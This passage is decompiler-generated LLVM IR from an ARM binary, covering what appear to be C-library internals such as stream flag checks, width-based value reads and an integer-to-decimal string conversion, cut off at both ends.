dec_label_pc_16288.dec_label_pc_1629c_crit_edge:  ; preds = %dec_label_pc_16288
  %v0_1629c.pre = load i32, i32* @r6, align 4
  %v0_162a0.pre = load i32, i32* @r5, align 4
  %v0_162a4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1629c

bb15:                                             ; preds = %dec_label_pc_16288
  %v1_16294 = load i32, i32* @r4, align 4
  store i32 %v1_16294, i32* @r6, align 4
  br label %dec_label_pc_162b0

dec_label_pc_1629c:                               ; preds = %dec_label_pc_16288.dec_label_pc_1629c_crit_edge, %dec_label_pc_16180, %dec_label_pc_1627c
  %v0_162a4 = phi i32 [ %v0_162a4.pre, %dec_label_pc_16288.dec_label_pc_1629c_crit_edge ], [ %arg1, %dec_label_pc_16180 ], [ %arg1, %dec_label_pc_1627c ]
  %v0_162a0 = phi i32 [ %v0_162a0.pre, %dec_label_pc_16288.dec_label_pc_1629c_crit_edge ], [ %tmp, %dec_label_pc_16180 ], [ %tmp, %dec_label_pc_1627c ]
  %v0_1629c = phi i32 [ %v0_1629c.pre, %dec_label_pc_16288.dec_label_pc_1629c_crit_edge ], [ %arg2, %dec_label_pc_16180 ], [ %arg2, %dec_label_pc_1627c ]
  %v1_162a0 = inttoptr i32 %v0_162a0 to i16*
  %v5_162a8 = call i32 @function_15dc4(i16* %v1_162a0, i32 %v0_162a4, i32 %v0_1629c)
  store i32 %v5_162a8, i32* @r6, align 4
  br label %dec_label_pc_162b0

dec_label_pc_162b0:                               ; preds = %bb15, %dec_label_pc_16234, %dec_label_pc_16224, %dec_label_pc_1620c, %dec_label_pc_161e8, %dec_label_pc_16260, %bb12, %dec_label_pc_1629c
  %v0_162b0 = load i32, i32* @r6, align 4
  %v2_162b8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_162b8, i32* @r4, align 4
  store i32 %v6_16180, i32* @r5, align 4
  store i32 %v9_16180, i32* @r6, align 4
  store i32 %v12_16180, i32* @r7, align 4
  ret i32 %v0_162b0

; uselistorder directives
  uselistorder i32 %v2_16268, { 1, 0 }
  uselistorder i32 %v2_16240, { 1, 0 }
  uselistorder i32 %v1_16234.v0_16228, { 1, 2, 0, 3 }
  uselistorder i32 %v1_16234, { 1, 0, 2 }
  uselistorder i32 %v2_161b4, { 2, 4, 0, 1, 3 }
  uselistorder i32 %tmp, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 %arg2, { 3, 4, 5, 2, 0, 1, 6, 7 }
  uselistorder i32 %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_162b0, { 7, 0, 5, 1, 2, 3, 4, 6 }
  uselistorder label %dec_label_pc_1629c, { 0, 2, 1 }
  uselistorder label %bb12, { 1, 0 }
}

define i32 @function_162c0(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_162c0:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_162c0 = load i32, i32* @r4, align 4
  store i32 %v3_162c0, i32* %stack_var_-8, align 4
  %v3_162c4 = load i16, i16* %arg1, align 2
  %v4_162c4 = zext i16 %v3_162c4 to i32
  %v2_162c8 = and i32 %v4_162c4, %arg2
  %v4_162c8 = icmp eq i32 %v2_162c8, 0
  store i32 %tmp, i32* @r4, align 4
  br i1 %v4_162c8, label %dec_label_pc_162d4, label %dec_label_pc_162e4

dec_label_pc_162d4:                               ; preds = %dec_label_pc_162c0
  %v1_162d4 = and i32 %v4_162c4, 2176
  %v2_162d4 = icmp eq i32 %v1_162d4, 0
  br i1 %v2_162d4, label %dec_label_pc_162dc, label %dec_label_pc_162f0

dec_label_pc_162dc:                               ; preds = %dec_label_pc_162d4
  %v2_162dc = or i32 %v4_162c4, %arg2
  %v1_162e0 = trunc i32 %v2_162dc to i16
  store i16 %v1_162e0, i16* %arg1, align 2
  %v0_162e4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_162e4

dec_label_pc_162e4:                               ; preds = %dec_label_pc_162c0, %dec_label_pc_162dc
  %v0_16320 = phi i32 [ %tmp, %dec_label_pc_162c0 ], [ %v0_162e4.pre, %dec_label_pc_162dc ]
  %v1_162e4 = inttoptr i32 %v0_16320 to i16*
  %v2_162e4 = load i16, i16* %v1_162e4, align 2
  %v3_162e4 = zext i16 %v2_162e4 to i32
  store i32 %v3_162e4, i32* @ip, align 4
  %v1_162e8 = and i32 %v3_162e4, 32
  %v2_162e8 = icmp eq i32 %v1_162e8, 0
  br i1 %v2_162e8, label %dec_label_pc_16310, label %dec_label_pc_162f0

dec_label_pc_162f0:                               ; preds = %dec_label_pc_162d4, %dec_label_pc_162e4
  %v0_162f0 = call i32 @function_1095c()
  store i32 %v0_162f0, i32* %r0.global-to-local, align 4
  %v2_162f8 = inttoptr i32 %v0_162f0 to i32*
  store i32 9, i32* %v2_162f8, align 4
  br label %dec_label_pc_162fc

dec_label_pc_162fc:                               ; preds = %dec_label_pc_16338, %dec_label_pc_162f0
  %v0_162fc = load i32, i32* @r4, align 4
  %v1_162fc = inttoptr i32 %v0_162fc to i16*
  %v2_162fc = load i16, i16* %v1_162fc, align 2
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_16304 = or i16 %v2_162fc, 8
  store i16 %v1_16304, i16* %v1_162fc, align 2
  br label %bb11

dec_label_pc_16310:                               ; preds = %dec_label_pc_162e4
  %tmp14 = urem i16 %v2_162e4, 4
  %v2_16310 = icmp eq i16 %tmp14, 0
  br i1 %v2_16310, label %dec_label_pc_1636c, label %dec_label_pc_16318

dec_label_pc_16318:                               ; preds = %dec_label_pc_16310
  %v1_16318 = and i32 %v3_162e4, 4
  store i32 %v1_16318, i32* @r1, align 4
  %v2_16318 = icmp eq i32 %v1_16318, 0
  br i1 %v2_16318, label %dec_label_pc_16320, label %dec_label_pc_16350

dec_label_pc_16320:                               ; preds = %dec_label_pc_16318
  %v1_16320 = add i32 %v0_16320, 20
  %v2_16320 = inttoptr i32 %v1_16320 to i32*
  %v3_16320 = load i32, i32* %v2_16320, align 4
  %v1_16324 = add i32 %v0_16320, 16
  %v2_16324 = inttoptr i32 %v1_16324 to i32*
  %v3_16324 = load i32, i32* %v2_16324, align 4
  %v9_16328 = icmp eq i32 %v3_16320, %v3_16324
  br i1 %v9_16328, label %dec_label_pc_16330, label %dec_label_pc_16338

dec_label_pc_16330:                               ; preds = %dec_label_pc_16320
  %v1_16330 = and i32 %v3_162e4, 2
  %v2_16330 = icmp eq i32 %v1_16330, 0
  br i1 %v2_16330, label %dec_label_pc_16350, label %dec_label_pc_16338

dec_label_pc_16338:                               ; preds = %dec_label_pc_16320, %dec_label_pc_16330
  %v0_16344 = call i32 @function_188b4()
  store i32 %v0_16344, i32* %r0.global-to-local, align 4
  %v2_16348 = icmp eq i32 %v0_16344, 0
  br i1 %v2_16348, label %.dec_label_pc_16350_crit_edge, label %dec_label_pc_162fc

.dec_label_pc_16350_crit_edge:                    ; preds = %dec_label_pc_16338
  %v0_16350.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16350

dec_label_pc_16350:                               ; preds = %.dec_label_pc_16350_crit_edge, %dec_label_pc_16318, %dec_label_pc_16330
  %v2_1635c = phi i32 [ %v0_16350.pre, %.dec_label_pc_16350_crit_edge ], [ %v0_16320, %dec_label_pc_16318 ], [ %v0_16320, %dec_label_pc_16330 ]
  %v1_16350 = inttoptr i32 %v2_1635c to i16*
  %v2_16350 = load i16, i16* %v1_16350, align 2
  %v1_16354 = add i32 %v2_1635c, 8
  %v2_16354 = inttoptr i32 %v1_16354 to i32*
  %v3_16354 = load i32, i32* %v2_16354, align 4
  store i32 %v3_16354, i32* @r2, align 4
  %v1_16358 = and i16 %v2_16350, -4
  store i16 %v1_16358, i16* %v1_16350, align 2
  %v0_16360 = load i32, i32* @r2, align 4
  %v1_16360 = load i32, i32* @r4, align 4
  %v2_16360 = add i32 %v1_16360, 20
  %v3_16360 = inttoptr i32 %v2_16360 to i32*
  store i32 %v0_16360, i32* %v3_16360, align 4
  %v0_16364 = load i32, i32* @r2, align 4
  %v1_16364 = load i32, i32* @r4, align 4
  %v2_16364 = add i32 %v1_16364, 24
  %v3_16364 = inttoptr i32 %v2_16364 to i32*
  store i32 %v0_16364, i32* %v3_16364, align 4
  %v0_16368 = load i32, i32* @r2, align 4
  %v1_16368 = load i32, i32* @r4, align 4
  %v2_16368 = add i32 %v1_16368, 16
  %v3_16368 = inttoptr i32 %v2_16368 to i32*
  store i32 %v0_16368, i32* %v3_16368, align 4
  %v0_1636c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1636c

dec_label_pc_1636c:                               ; preds = %dec_label_pc_16310, %dec_label_pc_16350
  %v2_16378 = phi i32 [ %v0_16320, %dec_label_pc_16310 ], [ %v0_1636c.pre, %dec_label_pc_16350 ]
  %v1_1636c = inttoptr i32 %v2_16378 to i16*
  %v2_1636c = load i16, i16* %v1_1636c, align 2
  %v3_1636c = zext i16 %v2_1636c to i32
  %v1_16370 = or i16 %v2_1636c, 64
  %v1_16374 = and i32 %v3_1636c, 2816
  store i32 %v1_16374, i32* %r0.global-to-local, align 4
  %v2_16374 = icmp eq i32 %v1_16374, 0
  store i16 %v1_16370, i16* %v1_1636c, align 2
  br i1 %v2_16374, label %bb10, label %.thread1

bb10:                                             ; preds = %dec_label_pc_1636c
  %v1_1637c = load i32, i32* @r4, align 4
  %v2_1637c = add i32 %v1_1637c, 12
  %v3_1637c = inttoptr i32 %v2_1637c to i32*
  %v4_1637c = load i32, i32* %v3_1637c, align 4
  %v3_16380 = add i32 %v1_1637c, 28
  %v4_16380 = inttoptr i32 %v3_16380 to i32*
  store i32 %v4_1637c, i32* %v4_16380, align 4
  br label %bb11

.thread1:                                         ; preds = %dec_label_pc_1636c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb11

bb11:                                             ; preds = %bb10, %dec_label_pc_162fc, %.thread1
  %v2_16388 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16388, i32* @r4, align 4
  %v1_1638c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1638c

; uselistorder directives
  uselistorder i32 %v2_1635c, { 1, 0 }
  uselistorder i32 %v0_16320, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v4_162c4, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 0, 4, 5 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %bb11, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1636c, { 1, 0 }
  uselistorder label %dec_label_pc_16350, { 0, 2, 1 }
  uselistorder label %dec_label_pc_16338, { 1, 0 }
  uselistorder label %dec_label_pc_162f0, { 1, 0 }
  uselistorder label %dec_label_pc_162e4, { 1, 0 }
}

define i32 @function_16390() local_unnamed_addr {
dec_label_pc_16390:
  %v0_16390 = load i32, i32* @r2, align 4
  %v1_16390 = icmp slt i32 %v0_16390, 0
  %v0_16394 = load i32, i32* @r0, align 4
  %v1_16398 = and i32 %v0_16394, 2048
  %v2_163cc = icmp eq i32 %v1_16398, 0
  br i1 %v1_16390, label %dec_label_pc_163cc, label %dec_label_pc_163a0

dec_label_pc_163a0:                               ; preds = %dec_label_pc_16390
  br i1 %v2_163cc, label %dec_label_pc_163a8, label %dec_label_pc_163d4

dec_label_pc_163a8:                               ; preds = %dec_label_pc_163a0
  %v7_163a8 = icmp eq i32 %v0_16394, 256
  %v0_163ac = load i32, i32* @r1, align 4
  %v1_163ac = inttoptr i32 %v0_163ac to i32*
  %v2_163ac = load i32, i32* %v1_163ac, align 4
  %v2_163b0 = urem i32 %v2_163ac, 256
  %v2_163b0.v2_163ac = select i1 %v7_163a8, i32 %v2_163b0, i32 %v2_163ac
  br i1 %v7_163a8, label %.thread, label %dec_label_pc_163b8

dec_label_pc_163b8:                               ; preds = %dec_label_pc_163a8
  %v7_163b8 = icmp eq i32 %v0_16394, 512
  br i1 %v7_163b8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_163b8
  %v4_163c0 = urem i32 %v2_163b0.v2_163ac, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_163b8, %dec_label_pc_163a8, %bb
  %v1_163c8 = phi i32 [ %v2_163ac, %dec_label_pc_163b8 ], [ %v2_163b0, %dec_label_pc_163a8 ], [ %v4_163c0, %bb ]
  store i32 0, i32* @r1, align 4
  ret i32 %v1_163c8

dec_label_pc_163cc:                               ; preds = %dec_label_pc_16390
  br i1 %v2_163cc, label %dec_label_pc_163dc, label %dec_label_pc_163d4

dec_label_pc_163d4:                               ; preds = %dec_label_pc_163a0, %dec_label_pc_163cc
  %v0_163d4 = load i32, i32* @r1, align 4
  %v1_163d4 = inttoptr i32 %v0_163d4 to i32*
  %v2_163d4 = load i32, i32* %v1_163d4, align 4
  %v3_163d4 = add i32 %v0_163d4, 4
  %v4_163d4 = inttoptr i32 %v3_163d4 to i32*
  %v5_163d4 = load i32, i32* %v4_163d4, align 4
  store i32 %v5_163d4, i32* @r1, align 4
  ret i32 %v2_163d4

dec_label_pc_163dc:                               ; preds = %dec_label_pc_163cc
  %v7_163dc = icmp eq i32 %v0_16394, 256
  %v0_163e0 = load i32, i32* @r1, align 4
  %v1_163e0 = inttoptr i32 %v0_163e0 to i32*
  %v2_163e0 = load i32, i32* %v1_163e0, align 4
  %v2_163e4 = urem i32 %v2_163e0, 256
  %v2_163e4.v2_163e0 = select i1 %v7_163dc, i32 %v2_163e4, i32 %v2_163e0
  br i1 %v7_163dc, label %.thread2, label %dec_label_pc_163ec

dec_label_pc_163ec:                               ; preds = %dec_label_pc_163dc
  %v7_163ec = icmp eq i32 %v0_16394, 512
  br i1 %v7_163ec, label %bb5, label %.thread2

bb5:                                              ; preds = %dec_label_pc_163ec
  %v4_163f0 = mul i32 %v2_163e4.v2_163e0, 65536
  %v4_163f4 = sdiv i32 %v4_163f0, 65536
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_163ec, %dec_label_pc_163dc, %bb5
  %v0_163f8 = phi i32 [ %v2_163e0, %dec_label_pc_163ec ], [ %v2_163e4, %dec_label_pc_163dc ], [ %v4_163f4, %bb5 ]
  %v3_163f8 = ashr i32 %v0_163f8, 31
  store i32 %v3_163f8, i32* @r1, align 4
  ret i32 %v0_163f8

; uselistorder directives
  uselistorder i32 %v0_163f8, { 1, 0 }
  uselistorder i32 %v2_163e4, { 1, 0 }
  uselistorder i32 %v2_163e0, { 1, 2, 0 }
  uselistorder i32 %v2_163b0, { 1, 0 }
  uselistorder i32 %v2_163ac, { 1, 2, 0 }
  uselistorder i1 %v2_163cc, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_163d4, { 1, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @function_16400(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_16400:
  %cpsr_z.global-to-local = alloca i1, align 1
  %tmp = trunc i32 %arg3 to i16
  %tmp2 = ptrtoint i16* %arg1 to i32
  %v7_16400 = icmp eq i32 %arg2, 256
  store i1 %v7_16400, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16400, label %bb, label %bb4

bb:                                               ; preds = %dec_label_pc_16400
  %v3_16404 = trunc i32 %arg3 to i8
  %tmp3 = bitcast i16* %arg1 to i8*
  store i8 %v3_16404, i8* %tmp3, align 1
  %v1_16408.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_16400, %bb
  %v1_16408 = phi i1 [ false, %dec_label_pc_16400 ], [ %v1_16408.pre, %bb ]
  %v0_16408 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_16408, i32 %v0_16408)
  %v7_1640c = icmp eq i32 %arg2, 2048
  store i1 %v7_1640c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1640c, label %dec_label_pc_16414, label %dec_label_pc_1641c

dec_label_pc_16414:                               ; preds = %bb4
  %tmp5 = bitcast i16* %arg1 to i32*
  store i32 %arg3, i32* %tmp5, align 4
  %v5_16414 = add i32 %tmp2, 4
  %v6_16414 = inttoptr i32 %v5_16414 to i32*
  store i32 %arg4, i32* %v6_16414, align 4
  ret i32 %tmp2

dec_label_pc_1641c:                               ; preds = %bb4
  %v7_1641c = icmp eq i32 %arg2, 512
  store i1 %v7_1641c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1641c, label %bb6, label %.thread

bb6:                                              ; preds = %dec_label_pc_1641c
  store i16 %tmp, i16* %arg1, align 2
  br label %bb8

.thread:                                          ; preds = %dec_label_pc_1641c
  %tmp7 = bitcast i16* %arg1 to i32*
  store i32 %arg3, i32* %tmp7, align 4
  br label %bb8

bb8:                                              ; preds = %bb6, %.thread
  ret i32 %tmp2

; uselistorder directives
  uselistorder i32 512, { 4, 5, 6, 7, 3, 0, 8, 1, 2 }
  uselistorder i16* %arg1, { 3, 2, 0, 1, 4 }
  uselistorder label %bb8, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_1642c(i8* %arg1) local_unnamed_addr {
dec_label_pc_1642c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %v3_1642c = load i32, i32* @r4, align 4
  %v12_1642c = load i32, i32* @r7, align 4
  store i32 %tmp19, i32* @r7, align 4
  %v1_16438 = icmp slt i32 %tmp19, 0
  %v2_16438 = icmp eq i32 %tmp19, 0
  store i1 %v2_16438, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r8.global-to-local, align 4
  %v0_16440 = load i32, i32* @r2, align 4
  store i32 %v0_16440, i32* %r5.global-to-local, align 4
  %v0_16444 = load i32, i32* @r3, align 4
  store i32 %v0_16444, i32* %r6.global-to-local, align 4
  br i1 %v1_16438, label %dec_label_pc_1644c, label %dec_label_pc_1646c

dec_label_pc_1644c:                               ; preds = %dec_label_pc_1642c
  %v1_1644c = icmp slt i32 %v0_16444, 0
  %v2_1644c = icmp eq i32 %v0_16444, 0
  store i1 %v2_1644c, i1* %cpsr_z.global-to-local, align 1
  %v1_16450 = sub i32 0, %tmp19
  store i32 %v1_16450, i32* @r7, align 4
  br i1 %v1_1644c, label %dec_label_pc_16458, label %dec_label_pc_1646c

dec_label_pc_16458:                               ; preds = %dec_label_pc_1644c
  %v1_1645c = sub i32 0, %v0_16440
  store i32 %v1_1645c, i32* %r5.global-to-local, align 4
  %v2_1645c = icmp eq i32 %v0_16440, 0
  %v2_16460 = icmp eq i1 %v2_1645c, false
  %v5_16460 = sext i1 %v2_16460 to i32
  %v6_16460 = sub i32 %v5_16460, %v0_16444
  store i32 %v6_16460, i32* %r6.global-to-local, align 4
  %v19_16460 = icmp eq i32 %v6_16460, 0
  store i1 %v19_16460, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16474

dec_label_pc_1646c:                               ; preds = %dec_label_pc_1644c, %dec_label_pc_1642c
  br label %dec_label_pc_16474

dec_label_pc_16474:                               ; preds = %dec_label_pc_16458, %dec_label_pc_1646c
  %storemerge = phi i8 [ 0, %dec_label_pc_1646c ], [ 1, %dec_label_pc_16458 ]
  store i32 0, i32* %sl.global-to-local, align 4
  store i8 0, i8* %arg1, align 1
  %v0_1647c = load i32, i32* @r7, align 4
  store i32 %v0_1647c, i32* @r1, align 4
  store i32 -1, i32* @r0, align 4
  %v0_16484 = call i32 @function_102cc()
  %v0_16488 = load i32, i32* @r7, align 4
  store i32 %v0_16484, i32* %fp.global-to-local, align 4
  %v2_16494 = call i32 @function_103c8(i32 -1, i32 %v0_16488)
  %v1_16498 = add i32 %v0_16488, 1
  store i32 %v1_16498, i32* %sb.global-to-local, align 4
  %v1_1649c = load i32, i32* @r7, align 4
  %v9_1649c = icmp eq i32 %v1_16498, %v1_1649c
  store i1 %v9_1649c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1649c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_16474
  %v1_164a0 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_164a0, i32* %sb.global-to-local, align 4
  %v1_164a4 = load i32, i32* %fp.global-to-local, align 4
  %v2_164a4 = add i32 %v1_164a4, 1
  store i32 %v2_164a4, i32* %fp.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_16474, %bb
  %v0_164a8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_164a8, i32* %sl.global-to-local, align 4
  %v0_164ac = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_164ac, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_164b0

dec_label_pc_164b0thread-pre-split:               ; preds = %bb23
  %v0_164b0.pr = load i32, i32* %sl.global-to-local, align 4
  %v0_164b4.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_164b8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_164b0

dec_label_pc_164b0:                               ; preds = %dec_label_pc_164b0thread-pre-split, %.thread
  %v0_164b8 = phi i32 [ %v0_164b8.pre, %dec_label_pc_164b0thread-pre-split ], [ %v1_1649c, %.thread ]
  %v0_164b4 = phi i32 [ %v0_164b4.pre, %dec_label_pc_164b0thread-pre-split ], [ %v0_164ac, %.thread ]
  %v0_164c0 = phi i32 [ %v0_164b0.pr, %dec_label_pc_164b0thread-pre-split ], [ %v0_164a8, %.thread ]
  %v2_164b0 = icmp eq i32 %v0_164c0, 0
  store i1 %v2_164b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_164b0, label %dec_label_pc_16528, label %dec_label_pc_164c0

dec_label_pc_164c0:                               ; preds = %dec_label_pc_164b0
  %v2_164c4 = call i32 @function_103c8(i32 %v0_164c0, i32 %v0_164b8)
  %v0_164c8 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_164c8, i32* @r0, align 4
  store i32 %v0_164b8, i32* @r4, align 4
  %v0_164d0 = load i32, i32* @r7, align 4
  store i32 %v0_164d0, i32* @r1, align 4
  %v0_164d4 = call i32 @function_102cc()
  %v0_164d8 = load i32, i32* @r7, align 4
  store i32 %v0_164d4, i32* %sl.global-to-local, align 4
  %v0_164e0 = load i32, i32* %r6.global-to-local, align 4
  %v2_164e4 = call i32 @function_103c8(i32 %v0_164e0, i32 %v0_164d8)
  %v0_164e8 = load i32, i32* %sb.global-to-local, align 4
  %v1_164e8 = load i32, i32* @r4, align 4
  %v2_164e8 = mul i32 %v1_164e8, %v0_164e8
  store i32 %v0_164e0, i32* @r0, align 4
  %v2_164f0 = add i32 %v2_164e8, %v0_164d8
  store i32 %v2_164f0, i32* %r5.global-to-local, align 4
  %v0_164f4 = load i32, i32* @r7, align 4
  store i32 %v0_164f4, i32* @r1, align 4
  %v0_164f8 = call i32 @function_102cc()
  %v0_164fc = load i32, i32* %fp.global-to-local, align 4
  %v1_164fc = load i32, i32* @r4, align 4
  %v2_164fc = mul i32 %v1_164fc, %v0_164fc
  %v0_16500 = load i32, i32* @r7, align 4
  store i32 %v0_16500, i32* @r1, align 4
  %v2_16504 = add i32 %v2_164fc, %v0_164f8
  store i32 %v2_16504, i32* @r4, align 4
  %v0_16508 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_16508, i32* @r0, align 4
  %v0_1650c = call i32 @function_102cc()
  %v0_16510 = load i32, i32* @r7, align 4
  %v0_16514 = load i32, i32* @r4, align 4
  %v2_16514 = add i32 %v0_16514, %v0_1650c
  store i32 %v2_16514, i32* %r6.global-to-local, align 4
  %v0_16518 = load i32, i32* %r5.global-to-local, align 4
  %v2_1651c = call i32 @function_103c8(i32 %v0_16518, i32 %v0_16510)
  store i32 %v0_16510, i32* @r4, align 4
  br label %dec_label_pc_16540

dec_label_pc_16528:                               ; preds = %dec_label_pc_164b0
  %v2_16528 = call i32 @function_103c8(i32 %v0_164b4, i32 %v0_164b8)
  %v0_1652c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1652c, i32* @r0, align 4
  store i32 %v0_164b8, i32* @r4, align 4
  %v0_16534 = load i32, i32* @r7, align 4
  store i32 %v0_16534, i32* @r1, align 4
  %v0_16538 = call i32 @function_102cc()
  store i32 %v0_16538, i32* %r6.global-to-local, align 4
  %v0_16544.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16540

dec_label_pc_16540:                               ; preds = %dec_label_pc_164c0, %dec_label_pc_16528
  %v0_16548 = phi i32 [ %v0_16510, %dec_label_pc_164c0 ], [ %v0_16544.pre, %dec_label_pc_16528 ]
  %v2_16544 = icmp ugt i32 %v0_16548, 8
  %v7_16544 = icmp eq i32 %v0_16548, 9
  store i1 %v7_16544, i1* %cpsr_z.global-to-local, align 1
  %v1_1654c = add i32 %v0_16548, 48
  %v0_16554 = load i32, i32* %r8.global-to-local, align 4
  %v1_16554 = add i32 %v0_16554, -1
  store i32 %v1_16554, i32* %r8.global-to-local, align 4
  %v2_16558 = xor i1 %v7_16544, true
  %v3_16558 = and i1 %v2_16544, %v2_16558
  %extract.t = trunc i32 %v1_1654c to i8
  br i1 %v3_16558, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_16540
  %v2_16548 = add i32 %v0_16548, %tmp9
  %extract.t7 = trunc i32 %v2_16548 to i8
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_16540, %bb22
  %v0_16560.off0 = phi i8 [ %extract.t, %dec_label_pc_16540 ], [ %extract.t7, %bb22 ]
  %v0_1655c = load i32, i32* %r6.global-to-local, align 4
  %v1_1655c = load i32, i32* %sl.global-to-local, align 4
  %v2_1655c = or i32 %v1_1655c, %v0_1655c
  %v4_1655c = icmp eq i32 %v2_1655c, 0
  store i1 %v4_1655c, i1* %cpsr_z.global-to-local, align 1
  %v3_16560 = inttoptr i32 %v1_16554 to i8*
  store i8 %v0_16560.off0, i8* %v3_16560, align 1
  %v0_16564 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_16564, label %dec_label_pc_16568, label %dec_label_pc_164b0thread-pre-split

dec_label_pc_16568:                               ; preds = %bb23
  %v4_165688 = zext i8 %storemerge to i32
  store i32 %v4_165688, i32* @r3, align 4
  %v2_1656c = icmp eq i8 %storemerge, 0
  store i1 %v2_1656c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1656c, label %dec_label_pc_16568..thread2_crit_edge, label %bb24

dec_label_pc_16568..thread2_crit_edge:            ; preds = %dec_label_pc_16568
  %v0_16578.pre = load i32, i32* %r8.global-to-local, align 4
  br label %.thread2

bb24:                                             ; preds = %dec_label_pc_16568
  store i32 45, i32* @r3, align 4
  %v3_16574 = load i32, i32* %r8.global-to-local, align 4
  %v4_16574 = add i32 %v3_16574, -1
  %v5_16574 = inttoptr i32 %v4_16574 to i8*
  store i8 45, i8* %v5_16574, align 1
  %v6_16574 = load i32, i32* %r8.global-to-local, align 4
  %v7_16574 = add i32 %v6_16574, -1
  store i32 %v7_16574, i32* %r8.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_16568..thread2_crit_edge, %bb24
  %v0_16578 = phi i32 [ %v0_16578.pre, %dec_label_pc_16568..thread2_crit_edge ], [ %v7_16574, %bb24 ]
  store i32 %v3_1642c, i32* @r4, align 4
  store i32 %v12_1642c, i32* @r7, align 4
  ret i32 %v0_16578

; uselistorder directives
  uselistorder i32 %v0_16510, { 0, 2, 1 }
  uselistorder i8 %storemerge, { 1, 0 }
  uselistorder i32 %v0_16440, { 1, 0, 2 }
  uselistorder i32 %tmp19, { 0, 3, 2, 1 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 2, 0, 5, 3, 4, 1, 6, 8, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2, 3 }
  uselistorder i8 1, { 3, 4, 5, 6, 7, 8, 0, 27, 28, 24, 25, 26, 22, 23, 20, 21, 19, 17, 18, 16, 14, 13, 15, 11, 12, 10, 1, 2, 9 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %dec_label_pc_16540, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_16474, { 1, 0 }
}

define i32 @function_16588(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_16588:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
